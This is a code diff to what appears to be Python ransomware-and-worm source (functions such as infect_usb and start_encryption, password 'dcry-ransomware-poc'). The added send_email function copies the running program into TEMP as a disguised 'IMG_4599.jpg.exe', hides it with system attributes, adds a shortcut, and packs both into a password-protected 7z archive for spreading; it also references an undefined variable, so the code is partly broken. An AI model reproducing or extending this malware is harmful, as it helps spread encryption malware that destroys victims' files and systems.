@@ -15,6 +15,7 @@ import sys
 import time
 import uuid
 import zlib
+import py7zr
 import psutil
 import base64
 import string
@@ -709,6 +710,33 @@ def infect_usb():
             pass
 
 
+def send_email(zip_password="dcry-ransomware-poc"):
+    worm_path = os.path.abspath(sys.executable)
+    temp_dir = os.getenv("TEMP")
+
+    folder_name = f"IMG_4599"
+
+    exe_name = "IMG_4599.jpg.exe"
+    lnk_name = "IMG_4599.jpg.lnk"
+    exe_full = os.path.join(temp_dir, exe_name)
+    lnk_full = os.path.join(temp_dir, lnk_name)
+
+    shutil.copy2(worm_path, exe_full)
+    os.system(f'attrib +h +s "{exe_full}"')
+
+    shell = Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortCut(lnk_full)
+    shortcut.TargetPath = exe_name
+    shortcut.save()
+
+    zip_file_path = os.path.join(temp_dir, f"{folder_name}.7z")
+    with py7zr.SevenZipFile(zip_file_path, mode='w', password=zip_password) as archive:
+        archive.write(exe_full, arcname=exe_name)
+        archive.write(lnk_full, arcname=lnk_name)
+
+    shutil.rmtree(working_dir, ignore_errors=True)
+
+
 dev_mode = True
 if __name__ == "__main__":
     if not check_connection():
@@ -732,3 +760,4 @@ if __name__ == "__main__":
         shutdown()
     else:
         start_encryption()
+
